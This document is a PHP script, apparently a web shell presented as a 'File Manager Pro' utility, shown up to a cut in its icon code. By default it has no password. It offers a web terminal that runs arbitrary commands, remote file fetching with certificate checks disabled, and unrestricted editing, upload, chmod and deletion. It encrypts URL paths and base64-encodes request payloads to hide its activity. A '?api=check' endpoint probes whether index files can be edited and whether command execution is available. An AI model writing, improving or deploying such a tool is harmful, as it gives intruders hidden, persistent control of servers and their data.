<?php
/* ============================================================
 *  FILE MANAGER PRO v2 — single file, PHP 5.4+ compatible
 *  ------------------------------------------------------------
 *  - Modern UI with inline SVG icons (no emoji)
 *  - Encrypted/obfuscated paths in URLs (AES-256-CTR via
 *    openssl when available, XOR+base64 fallback)
 *  - All POST payloads ffffbase64-encoded (URL-safe alphabet)
 *  - Full UTF-8 / special-character safe filenames
 *  - Features: browse, edit, view, download, multi-upload,
 *    upload from URL, new file, new folder, rename, copy,
 *    move, delete, chmod, zip (folder), recursive search,
 *    web terminal (command execution in current dir)
 *  - CSRF token on every POST form
 *
 *  Usage: drop on any PHP server, open in browser.
 *  Append ?api=check for JSON capability report.
 *
 *  SET $PW  — password ('plain', 'md5:<hash>' or 'sha256:<hash>')
 *  SET $KEY — secret used to encrypt URL path parameters
 * ============================================================ */

$PW  = '';
$KEY = 'fm-pro-change-this-secret-key-2026';

/* ---------------- low-level helpers ---------------- */

function fm_n($p) { return str_replace('\\', '/', (string)$p); }

function fm_h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

/** URL-safe base64 encode */
function fm_b64e($s) {
    return rtrim(strtr(base64_encode((string)$s), '+/', '-_'), '=');
}

/** URL-safe base64 decode (strict). Returns null on failure. */
function fm_b64d($s) {
    $s = (string)$s;
    if ($s === '') return '';
    $b = base64_decode(strtr($s, '-_', '+/'), true);
    return ($b === false) ? null : $b;
}

/** Encrypt a string for use in URLs. Prefix 'a'=AES, 'x'=XOR. */
function fm_enc($s) {
    global $KEY;
    if (function_exists('openssl_encrypt') && function_exists('hash')) {
        $iv  = substr(hash('sha256', $KEY . '#iv', true), 0, 16);
        $raw = hash('sha256', $KEY, true);
        $r   = @openssl_encrypt((string)$s, 'AES-256-CTR', $raw, OPENSSL_RAW_DATA, $iv);
        if ($r !== false) return 'a' . fm_b64e($r);
    }
    $key = function_exists('hash') ? hash('sha256', $KEY, true) : md5($KEY, true);
    $kl  = strlen($key);
    $out = '';
    $len = strlen((string)$s);
    for ($i = 0; $i < $len; $i++) { $out .= $s[$i] ^ $key[$i % $kl]; }
    return 'x' . fm_b64e($out);
}

/** Decrypt a value produced by fm_enc(). Returns null on failure. */
function fm_dec($s) {
    global $KEY;
    $s = (string)$s;
    if ($s === '') return null;
    $tag = substr($s, 0, 1);
    $raw = fm_b64d(substr($s, 1));
    if ($raw === null) return null;
    if ($tag === 'a' && function_exists('openssl_decrypt')) {
        $iv = substr(hash('sha256', $KEY . '#iv', true), 0, 16);
        $r  = @openssl_decrypt($raw, 'AES-256-CTR', hash('sha256', $KEY, true), OPENSSL_RAW_DATA, $iv);
        return ($r === false) ? null : $r;
    }
    if ($tag === 'x') {
        $key = function_exists('hash') ? hash('sha256', $KEY, true) : md5($KEY, true);
        $kl  = strlen($key);
        $out = '';
        $len = strlen($raw);
        for ($i = 0; $i < $len; $i++) { $out .= $raw[$i] ^ $key[$i % $kl]; }
        return $out;
    }
    return null;
}

/** Resolve any absolute path to canonical form, null if invalid. */
function fm_resolve($path) {
    $path = fm_n($path);
    if ($path === '') return null;
    if (strpos($path, "\0") !== false) return null;
    if (strpos($path, '://') !== false) return null;
    $r = @realpath($path);
    return ($r !== false) ? fm_n($r) : null;
}

function fm_base($p) {
    $p = fm_n($p);
    if ($p === '/') return '/';
    $i = strrpos($p, '/');
    return $i === false ? $p : substr($p, $i + 1);
}

function fm_ls($dir) {
    $out = array();
    if (function_exists('scandir')) {
        $r = @scandir($dir);
        if ($r !== false) return $r;
    }
    if (!function_exists('opendir')) return $out;
    $h = @opendir($dir);
    if (!$h) return $out;
    while (($n = readdir($h)) !== false) $out[] = $n;
    @closedir($h);
    return $out;
}

function fm_rmdir_r($dir) {
    if (!is_dir($dir)) return false;
    foreach (fm_ls($dir) as $it) {
        if ($it === '.' || $it === '..') continue;
        $p = $dir . '/' . $it;
        if (is_dir($p)) { fm_rmdir_r($p); } else { @unlink($p); }
    }
    return @rmdir($dir);
}

function fm_copy_dir($src, $dst) {
    if (!@is_dir($src)) return false;
    if (!@mkdir($dst, 0777, true) && !@is_dir($dst)) return false;
    foreach (fm_ls($src) as $it) {
        if ($it === '.' || $it === '..') continue;
        $s = $src . '/' . $it;
        $d = $dst . '/' . $it;
        if (@is_dir($s)) { if (!fm_copy_dir($s, $d)) return false; }
        else { if (!@copy($s, $d)) return false; }
    }
    return true;
}

/** Execute a shell command in $cwd. Returns array(stdout+stderr, exit code). */
function fm_exec($cmd, $cwd) {
    $out = ''; $code = 0;
    if (function_exists('proc_open')) {
        $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $proc = @proc_open($cmd, $desc, $pipes, $cwd);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            @stream_set_timeout($pipes[1], 30);
            @stream_set_timeout($pipes[2], 30);
            $o1 = @stream_get_contents($pipes[1]);
            $o2 = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]); @fclose($pipes[2]);
            $code = @proc_close($proc);
            if ($o1 === false) $o1 = '';
            if ($o2 === false) $o2 = '';
            return array($o1 . $o2, (int)$code);
        }
    }
    if (function_exists('shell_exec') || function_exists('exec') || function_exists('passthru')) {
        $prev = @getcwd();
        if ($cwd && is_dir($cwd)) { @chdir($cwd); }
        if (function_exists('shell_exec')) {
            $o = @shell_exec($cmd . ' 2>&1');
            if ($o !== null) { if ($prev) @chdir($prev); return array((string)$o, 0); }
        }
        if (function_exists('exec')) {
            $lines = array(); $c2 = 0;
            @exec($cmd . ' 2>&1', $lines, $c2);
            if ($prev) @chdir($prev);
            return array(implode("\n", $lines) . "\n", (int)$c2);
        }
        ob_start(); $c3 = 0;
        @passthru($cmd . ' 2>&1', $c3);
        $o = (string)ob_get_clean();
        if ($prev) @chdir($prev);
        return array($o, (int)$c3);
    }
    return array('', -1);
}

/** Download a remote file (cURL preferred, streams fallback). */
function fm_fetch_url($url, &$err) {
    $err = '';
    if (function_exists('curl_init')) {
        $ch = @curl_init();
        if (!$ch) { $err = 'curl init failed'; return false; }
        @curl_setopt($ch, CURLOPT_URL, $url);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        @curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 90);
        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (FileManagerPro)');
        @curl_setopt($ch, CURLOPT_ENCODING, '');
        $data = @curl_exec($ch);
        $cerr = (string)@curl_error($ch);
        $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE);
        @curl_close($ch);
        if ($data === false) { $err = $cerr !== '' ? $cerr : 'request failed'; return false; }
        if ($code >= 400) { $err = 'HTTP ' . $code; return false; }
        return $data;
    }
    if (ini_get('allow_url_fopen')) {
        $opts = array('method' => 'GET', 'timeout' => 90, 'follow_location' => 5,
                      'user_agent' => 'Mozilla/5.0 (FileManagerPro)', 'ignore_errors' => true);
        $ctx = @stream_context_create(array('http' => $opts, 'https' => $opts));
        $data = @file_get_contents($url, false, $ctx);
        if ($data === false) { $err = 'download failed'; return false; }
        return $data;
    }
    $err = 'no HTTP client (need cURL or allow_url_fopen)';
    return false;
}

function fm_perm_str($path) {
    $p = @fileperms($path);
    if ($p === false) return '----';
    return substr(sprintf('%o', (int)$p), -4);
}

function fm_size_int($path) {
    $s = @filesize($path);
    return ($s === false) ? -1 : (int)$s;
}

function fm_size_str($path) {
    $s = fm_size_int($path);
    if ($s < 0) return '?';
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 1) . ' MB';
    if ($s >= 1024) return round($s / 1024, 1) . ' KB';
    return $s . ' B';
}

function fm_kind($path) {
    if (@is_link($path)) return 'link';
    if (@is_dir($path))  return 'dir';
    return 'file';
}

function fm_ext($name) {
    $i = strrpos($name, '.');
    if ($i === false || $i === 0) return '';
    return strtolower(substr($name, $i + 1));
}

/** RFC 5987 safe Content-Disposition filename */
function fm_disposition($name) {
    $fallback = preg_replace('/[^\x20-\x7E]/', '_', $name);
    $fallback = str_replace(array('"', '\\', ';'), '_', $fallback);
    if ($fallback === '') $fallback = 'download';
    return "attachment; filename=\"$fallback\"; filename*=UTF-8''" . rawurlencode($name);
}

/* ---------------- bootstrap ---------------- */

error_reporting(0);
@ini_set('display_errors', '0');
if (function_exists('ob_start')) { @ob_start(); }
if (function_exists('mb_internal_encoding')) { @mb_internal_encoding('UTF-8'); }

/* ---------------- session, CSRF, auth ---------------- */

if (function_exists('session_id') && session_id() === '') { @session_start(); }
$CSRF = '';
if (isset($_SESSION) && is_array($_SESSION)) {
    if (empty($_SESSION['fm_csrf'])) {
        if (function_exists('random_bytes')) { $_SESSION['fm_csrf'] = bin2hex(random_bytes(16)); }
        elseif (function_exists('openssl_random_pseudo_bytes')) { $_SESSION['fm_csrf'] = bin2hex(openssl_random_pseudo_bytes(16)); }
        else { $_SESSION['fm_csrf'] = sha1(uniqid(mt_rand(), true)); }
    }
    $CSRF = (string)$_SESSION['fm_csrf'];
}

function fm_check_csrf() {
    if ($GLOBALS['CSRF'] === '') return true; // sessions unavailable: skip check
    if (!isset($_POST['csrf'])) return false;
    return (string)$_POST['csrf'] === $GLOBALS['CSRF'];
}

/* password gate */
if ($PW !== '') {
    $ok = false;
    if (isset($_POST['fm_pw'])) {
        $given = (string)$_POST['fm_pw'];
        if (strpos($PW, 'md5:') === 0)    { $ok = md5($given) === substr($PW, 4); }
        elseif (strpos($PW, 'sha256:') === 0) { $ok = hash('sha256', $given) === substr($PW, 7); }
        else { $ok = ($given === $PW); }
        if ($ok) $_SESSION['fm_ok'] = 1;
    }
    if (empty($_SESSION['fm_ok'])) {
        @header('Content-Type: text/html; charset=utf-8');
        echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in — File Manager Pro</title>';
        echo '<style>body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(1200px 600px at 20% 0%,#1e293b,#0b1120);color:#e2e8f0;font:15px/1.5 system-ui,sans-serif}';
        echo '.card{background:rgba(30,41,59,.85);border:1px solid #334155;border-radius:18px;padding:36px;width:340px;backdrop-filter:blur(8px);box-shadow:0 20px 60px rgba(0,0,0,.45)}';
        echo 'h2{margin:0 0 6px;font-size:18px;font-weight:700;display:flex;gap:10px;align-items:center}p.sub{margin:0 0 22px;font-size:12.5px;color:#94a3b8}';
        echo 'input{width:100%;padding:11px 13px;border:1px solid #475569;border-radius:10px;background:#0b1120;color:#e2e8f0;font-size:14px;box-sizing:border-box;margin-bottom:14px}';
        echo 'input:focus{outline:none;border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,.2)}';
        echo 'button{width:100%;padding:11px;border:none;border-radius:10px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:14px;font-weight:600;cursor:pointer}button:hover{filter:brightness(1.12)}</style></head><body>';
        echo '<form method="post" class="card"><h2><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> File Manager Pro</h2>';
        echo '<p class="sub">Enter your password to continue</p>';
        echo '<input type="password" name="fm_pw" placeholder="Password" autofocus autocomplete="current-password">';
        echo '<button type="submit">Sign in</button></form></body></html>';
        exit;
    }
}

/* ---------------- capability report (?api=check) ---------------- */

if (isset($_GET['api'])) {
    @header('Content-Type: application/json; charset=utf-8');
    $root = fm_n(dirname(__FILE__));
    $rr = @realpath($root);
    if ($rr !== false) $root = fm_n($rr);
    $rw = false;
    $probe = $root . '/.fm_probe.tmp';
    if (@file_put_contents($probe, 'ok') !== false) {
        $c = @file_get_contents($probe);
        $rw = ($c === 'ok');
    }
    @unlink($probe);
    $ie = false;
    $ifiles = array();
    foreach (array('index.php', 'index.html', 'index.htm') as $f) {
        $p = $root . '/' . $f;
        if (@is_file($p)) {
            $ifiles[] = $f;
            $h = @fopen($p, 'a');
            if ($h !== false) { @fclose($h); $ie = true; }
        }
    }
    $report = array(
        'ok' => ($rw && $ie),
        'root_writable' => $rw,
        'index_editable' => $ie,
        'index_files' => $ifiles,
        'php_version' => PHP_VERSION,
        'server' => isset($_SERVER['SERVER_SOFTWARE']) ? (string)$_SERVER['SERVER_SOFTWARE'] : 'unknown',
        'os' => PHP_OS,
        'root' => $root,
        'openssl' => function_exists('openssl_encrypt'),
        'zip' => class_exists('ZipArchive'),
        'exec' => function_exists('shell_exec') || function_exists('proc_open') || function_exists('exec') || function_exists('passthru'),
        'curl' => function_exists('curl_init'),
        'allow_url_fopen' => (bool)ini_get('allow_url_fopen'),
    );
    echo function_exists('json_encode') ? json_encode($report) : '{"ok":false,"error":"json_encode unavailable"}';
    exit;
}

/* ---------------- script dir & current dir ---------------- */

$scriptDir = fm_n(dirname(__FILE__));
$sd = @realpath($scriptDir); if ($sd !== false) $scriptDir = fm_n($sd);

function fm_cur_dir() {
    global $scriptDir;
    if (isset($_GET['d'])) {
        $d = fm_dec((string)$_GET['d']);
        if ($d !== null) {
            $r = fm_resolve($d);
            if ($r !== null && @is_dir($r)) return $r;
        }
    }
    return $scriptDir;
}

/* ---------------- download / view (GET, before HTML) ---------------- */

if (isset($_GET['a'])) {
    $act = (string)$_GET['a'];

    if ($act === 'dl' || $act === 'view') {
        $f = isset($_GET['f']) ? fm_dec((string)$_GET['f']) : null;
        $p = ($f !== null) ? fm_resolve($f) : null;
        if ($p !== null && @is_file($p) && is_readable($p)) {
            $name = fm_base($p);
            $ext  = fm_ext($name);
            $mime = 'application/octet-stream';
            $mimes = array(
                'txt'=>'text/plain; charset=utf-8','md'=>'text/plain; charset=utf-8','log'=>'text/plain; charset=utf-8',
                'json'=>'application/json','js'=>'text/javascript','css'=>'text/css','xml'=>'application/xml','htm'=>'text/html','html'=>'text/html',
                'php'=>'text/plain; charset=utf-8','phtml'=>'text/plain; charset=utf-8',
                'png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','webp'=>'image/webp','svg'=>'image/svg+xml','ico'=>'image/x-icon','bmp'=>'image/bmp',
                'pdf'=>'application/pdf','mp3'=>'audio/mpeg','wav'=>'audio/wav','ogg'=>'audio/ogg','mp4'=>'video/mp4','webm'=>'video/webm',
                'zip'=>'application/zip',);
            if (isset($mimes[$ext])) $mime = $mimes[$ext];
            while (@ob_end_clean()) {}
            @header('Content-Type: ' . $mime);
            @header('X-Content-Type-Options: nosniff');
            if ($act === 'dl') {
                @header('Content-Disposition: ' . fm_disposition($name));
                @header('Content-Length: ' . fm_size_int($p));
            }
            $full = fm_size_int($p);
            if ($full <= 64 * 1048576 && function_exists('readfile')) {
                @readfile($p);
            } else {
                $h = @fopen($p, 'rb');
                if ($h) { while (!feof($h)) { echo @fread($h, 8192); } @fclose($h); }
            }
        } else {
            @header('HTTP/1.0 404 Not Found');
            echo 'Not found or not readable.';
        }
        exit;
    }
}

/* ---------------- POST actions ---------------- */

$msg = '';
$err = '';
$termFlash = '';

/** Read a POST field. Prefers the JS-encoded 'k_b64' (base64); falls back to
 *  the raw 'k' value UNTouched (e.g. when JS is unavailable). Null when missing. */
function fm_post($k) {
    if (isset($_POST[$k . '_b64'])) {
        $v = fm_b64d((string)$_POST[$k . '_b64']);
        if ($v !== null) return $v;
    }
    if (isset($_POST[$k])) return (string)$_POST[$k];
    return null;
}

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a'])) {
    if (!fm_check_csrf()) {
        $err = 'Session expired or bad CSRF token — please retry.';
    } else {
        $act = (string)$_POST['a'];
        $dirRaw = fm_post('dir');
        $dir = ($dirRaw !== null) ? fm_resolve($dirRaw) : null;
        if ($dir === null || !@is_dir($dir)) {
            $dir = $scriptDir;
        }

        if ($act === 'save') {
            $f = fm_post('file');
            $p = ($f !== null) ? fm_resolve($f) : null;
            if ($p !== null && @is_file($p)) {
                $c = fm_post('content');
                if ($c === null) { $c = isset($_POST['content']) ? (string)$_POST['content'] : ''; }
                $ok = @file_put_contents($p, $c);
                if ($ok !== false) { $msg = 'Saved: ' . fm_base($p); } else { $err = 'Save failed (permissions?).'; }
            } else { $err = 'File not found.'; }

        } elseif ($act === 'goto') {
            $dest = fm_post('dest');
            $r = ($dest !== null) ? fm_resolve($dest) : null;
            if ($r !== null && @is_dir($r)) {
                while (@ob_end_clean()) {}
                @header('Location: ?d=' . fm_enc($r));
                exit;
            }
            $err = 'Invalid path.';

        } elseif ($act === 'upload') {
            if (!empty($_FILES['up']) && is_array($_FILES['up']['name'])) {
                $done = 0; $failed = 0;
                $count = count($_FILES['up']['name']);
                for ($i = 0; $i < $count; $i++) {
                    $name = (string)$_FILES['up']['name'][$i];
                    $tmp  = (string)$_FILES['up']['tmp_name'][$i];
                    if ($name === '' || $tmp === '' || !empty($_FILES['up']['error'][$i])) { $failed++; continue; }
                    if (function_exists('is_uploaded_file') && !is_uploaded_file($tmp)) { $failed++; continue; }
                    $dest = $dir . '/' . fm_n(basename(fm_n($name)));
                    $ok = false;
                    if (function_exists('move_uploaded_file')) { $ok = @move_uploaded_file($tmp, $dest); }
                    if (!$ok && function_exists('copy')) { $ok = @copy($tmp, $dest); }
                    if ($ok) { $done++; } else { $failed++; }
                }
                if ($done > 0) { $msg = "Uploaded $done file(s)." . ($failed ? " $failed failed." : ''); }
                else { $err = 'Upload failed — no files received or write denied.'; }
            } else {
                $err = 'No file received.';
            }

        } elseif ($act === 'newfile') {
            $name = fm_post('name');
            $name = ($name !== null) ? basename(fm_n($name)) : '';
            if ($name !== '' && $name !== '.' && $name !== '..' && strpos($name, "\0") === false) {
                $p = $dir . '/' . $name;
                if (@file_exists($p)) { $err = 'Already exists: ' . $name; }
                else {
                    $ok = @file_put_contents($p, '');
                    if ($ok !== false) { $msg = 'Created: ' . $name; } else { $err = 'Create failed (permissions?).'; }
                }
            } else { $err = 'Invalid file name.'; }

        } elseif ($act === 'mkdir') {
            $name = fm_post('name');
            $name = ($name !== null) ? basename(fm_n($name)) : '';
            if ($name !== '' && $name !== '.' && $name !== '..') {
                $ok = @mkdir($dir . '/' . $name, 0777, true);
                if ($ok) { $msg = 'Folder created: ' . $name; } else { $err = 'Mkdir failed (exists or denied?).'; }
            } else { $err = 'Invalid folder name.'; }

        } elseif ($act === 'rename') {
            $f = fm_post('file');
            $p = ($f !== null) ? fm_resolve($f) : null;
            $new = fm_post('newname');
            $new = ($new !== null) ? basename(fm_n($new)) : '';
            if ($p !== null && $new !== '' && $new !== '.' && $new !== '..' && strpos($new, "\0") === false) {
                $ok = @rename($p, fm_n(dirname($p)) . '/' . $new);
                if ($ok) { $msg = 'Renamed to ' . $new; } else { $err = 'Rename failed.'; }
            } else { $err = 'Invalid name.'; }

        } elseif ($act === 'copy' || $act === 'move') {
            $f = fm_post('file');
            $p = ($f !== null) ? fm_resolve($f) : null;
            $dest = fm_post('dest');
            $dest = ($dest !== null) ? fm_resolve($dest) : null;
            if ($p !== null && $dest !== null && @is_dir($dest)) {
                $target = $dest . '/' . fm_base($p);
                if (@file_exists($target)) { $err = 'Target already exists: ' . fm_base($target); }
                elseif ($act === 'copy') {
                    if (@is_dir($p)) {
                        $ok = function_exists('fm_copy_dir') ? fm_copy_dir($p, $target) : false;
                        if (!$ok && function_exists('shell_exec')) {
                            @shell_exec('cp -r ' . escapeshellarg($p) . ' ' . escapeshellarg($target));
                            $ok = @is_dir($target);
                        }
                    } else {
                        $ok = @copy($p, $target);
                    }
                    if ($ok) { $msg = 'Copied to ' . $target; } else { $err = 'Copy failed.'; }
                } else {
                    $ok = @rename($p, $target);
                    if ($ok) { $msg = 'Moved to ' . $target; } else { $err = 'Move failed.'; }
                }
            } else { $err = 'Invalid source or destination.'; }

        } elseif ($act === 'delete') {
            $f = fm_post('file');
            $p = ($f !== null) ? fm_resolve($f) : null;
            if ($p !== null) {
                if (is_dir($p)) { $ok = fm_rmdir_r($p); } else { $ok = @unlink($p); }
                if ($ok) { $msg = 'Deleted: ' . fm_base($p); } else { $err = 'Delete failed.'; }
            } else { $err = 'Cannot delete that.'; }

        } elseif ($act === 'chmod') {
            $f = fm_post('file');
            $p = ($f !== null) ? fm_resolve($f) : null;
            $m = fm_post('mode');
            $m = ($m !== null) ? trim((string)$m) : '';
            $mode = -1;
            if (preg_match('/^[0-7]{3,4}$/', $m)) { $mode = (int)octdec($m); }   // classic octal notation (755, 0644…)
            elseif (is_numeric($m)) { $mode = (int)$m; }                          // plain decimal integer
            if ($mode >= 0 && $mode <= 4095) { /* valid range */ } else { $mode = -1; }
            if ($p !== null && $mode >= 0 && function_exists('chmod')) {
                $ok = @chmod($p, $mode);
                if ($ok) { $msg = 'Chmod applied: ' . sprintf('%04o', $mode);} else { $err = 'Chmod failed.'; }
            } else { $err = 'Chmod not supported or invalid value.'; }

        } elseif ($act === 'zip') {
            $f = fm_post('file');
            $p = ($f !== null) ? fm_resolve($f) : null;
            if ($p !== null && @is_dir($p)) {
                if (class_exists('ZipArchive')) {
                    $zipPath = $p . '.zip';
                    $zip = new ZipArchive();
                    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                        $base = fm_base($p);
                        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, FilesystemIterator::SKIP_DOTS));
                        $added = 0;
                        foreach ($rii as $item) {
                            $ip = fm_n($item->getPathname());
                            $local = $base . '/' . ltrim(substr($ip, strlen($p)), '/');
                            if ($item->isDir()) { $zip->addEmptyDir($local); }
                            else { $zip->addFile($ip, $local); $added++; }
                        }
                        $zip->close();
                        $msg = 'Archive created: ' . fm_base($zipPath) . " ($added files)";
                    } else { $err = 'Could not create zip.'; }
                } else { $err = 'ZipArchive not available on this server.'; }
            } else { $err = 'Select a folder to zip.'; }

        } elseif ($act === 'fetch') {
            $url = fm_post('url');
            $url = ($url !== null) ? trim($url) : '';
            $name = fm_post('name');
            $name = ($name !== null) ? trim($name) : '';
            $parts = @parse_url($url);
            $scheme = isset($parts['scheme']) ? strtolower($parts['scheme']) : '';
            if ($url === '' || !in_array($scheme, array('http', 'https', 'ftp'), true) || empty($parts['host'])) {
                $err = 'Invalid URL — use http://, https:// or ftp://';
            } else {
                if ($name === '') {
                    $name = isset($parts['path']) ? basename(fm_n($parts['path'])) : '';
                    if ($name === '' || $name === '.' || $name === '..') { $name = 'download.bin'; }
                }
                $name = basename(fm_n($name));
                if ($name === '' || strpos($name, "\0") !== false) { $err = 'Invalid file name.'; }
                else {
                    $ferr = '';
                    $data = fm_fetch_url($url, $ferr);
                    if ($data === false) { $err = 'Fetch failed: ' . $ferr; }
                    else {
                        $dest = $dir . '/' . $name;
                        if (@file_put_contents($dest, $data) !== false) {
                            $msg = 'Fetched: ' . $name . ' (' . fm_size_str($dest) . ')';
                        } else { $err = 'Write failed: ' . $name . ' (permissions?)'; }
                    }
                }
            }

        } elseif ($act === 'terminal') {
            $cmd = fm_post('cmd');
            if ($cmd === null || trim($cmd) === '') {
                $err = 'Empty command.';
            } else {
                list($o, $code) = fm_exec($cmd, $dir);
                if (strlen($o) > 65536) { $o = "[output truncated]\n" . substr($o, -65536); }
                $chunk = '$ ' . $cmd . "\n";
                if ($o !== '') { $chunk .= rtrim($o, "\n") . "\n"; }
                if ($code !== 0) { $chunk .= '[exit ' . $code . "]\n"; }
                if (isset($_SESSION) && is_array($_SESSION)) {
                    if (!isset($_SESSION['fm_term'])) { $_SESSION['fm_term'] = ''; }
                    $_SESSION['fm_term'] .= $chunk;
                    if (strlen($_SESSION['fm_term']) > 120000) { $_SESSION['fm_term'] = substr($_SESSION['fm_term'], -90000); }
                } else {
                    $termFlash .= $chunk;
                }
            }

        } elseif ($act === 'tclear') {
            if (isset($_SESSION) && is_array($_SESSION)) { $_SESSION['fm_term'] = ''; }
        }
    }
}

/* ---------------- current dir & view state ---------------- */

$cur = fm_cur_dir();
$curEnc = fm_enc($cur);

$parent = fm_n(dirname($cur));
$hasParent = ($parent !== $cur && $parent !== '' && $parent !== '.');

$editFile = null;
if (isset($_GET['a']) && (string)$_GET['a'] === 'edit') {
    $ef = isset($_GET['f']) ? fm_dec((string)$_GET['f']) : null;
    if ($ef !== null) { $ep = fm_resolve($ef); if ($ep !== null && @is_file($ep)) $editFile = $ep; }
}

$viewFile = null;
if (isset($_GET['a']) && (string)$_GET['a'] === 'preview') {
    $vf = isset($_GET['f']) ? fm_dec((string)$_GET['f']) : null;
    if ($vf !== null) { $vp = fm_resolve($vf); if ($vp !== null && @is_file($vp)) $viewFile = $vp; }
}

$termOn = (isset($_GET['a']) && (string)$_GET['a'] === 'term');

$termUser = function_exists('get_current_user') ? (string)get_current_user() : 'user';
if ($termUser === '') { $termUser = 'user'; }
$termHost = function_exists('gethostname') ? (string)gethostname() : (string)php_uname('n');
if ($termHost === '') { $termHost = 'host'; }

$termOut = $termFlash;
if (isset($_SESSION) && is_array($_SESSION) && isset($_SESSION['fm_term'])) {
    $termOut = (string)$_SESSION['fm_term'] . $termFlash;
}

$searchQ = isset($_GET['q']) ? (string)$_GET['q'] : '';
$searchResults = null;
if ($searchQ !== '' && $editFile === null && $viewFile === null && !$termOn) {
    $needle = function_exists('mb_strtolower') ? mb_strtolower($searchQ, 'UTF-8') : strtolower($searchQ);
    $searchResults = array();
    $stack = array($cur);
    $visited = 0;
    while (!empty($stack) && count($searchResults) < 200 && $visited < 20000) {
        $d = array_pop($stack);
        $visited++;
        foreach (fm_ls($d) as $it) {
            if ($it === '.' || $it === '..') continue;
            $full = $d . '/' . $it;
            $hay = function_exists('mb_strtolower') ? mb_strtolower($it, 'UTF-8') : strtolower($it);
            if (strpos($hay, $needle) !== false) {
                $searchResults[] = array('name' => $it, 'path' => $full, 'dir' => @is_dir($full));
            }
            if (@is_dir($full) && !@is_link($full)) $stack[] = $full;
        }
    }
}

/* ---------------- SVG icons ---------------- */

function fm_svg($body, $size) {
    return '<svg width="' . (int)$size . '" height="' . (int)$size . '" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' . $body . '</svg>';
}

function fm_icon_type($kind, $ext) {
    if ($kind === 'dir') return 'dir';
    if ($kind === 'link') return 'link';
    $map = array(
        'image'   => array('png','jpg','jpeg','gif','webp','bmp','ico','svg','tiff'),
        'code'    => array('php','phtml','js','css','html','htm','json','xml','py','rb','java','c','cpp','h','sh','sql','yml','yaml','ini','conf','htaccess','ts','vue','go','rs'),
        'archive' => array('zip','rar','7z','tar','gz','bz2','xz'),
        'doc'     => array('txt','md','rtf','doc','docx','odt','pdf','xls','xlsx','csv','ppt','pptx'),
        'audio'   => array('mp3','wav','ogg','flac','m4a'),
        'video'   => array('mp4','webm','mkv','avi','mov'),
        'font'    => array('ttf','otf','woff','woff2','eot'),
    );
    foreach ($map as $t => $exts) { if (in_array($ext, $exts, true)) return $t; }
    return 'file';
}

function fm_icon($kind, $ext, $size) {
    if ($kind === 'dir') {
        return fm_svg('<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>', $size);
    }
    if ($kind === 'link') {
        return fm_svg('<path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>', $size);
    }
    $type = fm_icon_type($kind, $ext);
    $bodies = array(
        'image'   => '<rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="8.5" cy="9.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>',
        'code'    => '<path d="M8 6l-6 6 6 6"/><path d="M16 6l6 6-6 6"/>',
        'archive' => '<rect x="3" y="4" width="18" height="5" rx="1"/><path d="M5 9v11a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V9"/><path d="M10 13h4"/>',
        'doc'     => '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M9 13h6M9 17h6"/>',
        'audio'   => '<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>',
        'video'   => '<rect x="2" y="5" width="20" height="14" rx="2"/><path d="M10 9l5 3-5 3z"/>',
        'font'    => '<path d="M4 20L12 4l8 16"/><path d="M7.5 14h9"/>',
        'file'    => '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/>',
    );
    return fm_svg($bodies[$type], $size);
}

function fm_ai($name, $size) {
    $bodies = array(
        'edit'     => '<path d="M17 3a2.83 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5z"/>',
        'view'     => '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',
        'download' => '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/>',
